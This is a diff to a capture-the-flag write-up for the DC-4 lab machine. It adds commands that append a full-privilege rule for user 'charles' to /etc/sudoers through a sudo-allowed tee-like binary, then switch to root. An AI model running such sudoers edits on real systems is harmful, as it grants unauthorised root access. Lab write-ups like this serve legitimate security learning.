@@ -64,6 +64,10 @@ teehee command reads the standard input and writes it to both the standard outpu
   <img src="https://rajoul.github.io/my_write_up/image/DC-4/12.png" >
 </p>
 So I changed the file /etc/sudoers to give charles priviledge to execute every command as root.I run /bin/bash as root.
+```
+echo "charles ALL=(ALL) ALL" |sudo /usr/bin/teehee /etc/sudoers
+sudo su
+```
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/DC-4/root_access.png" >
 </p>
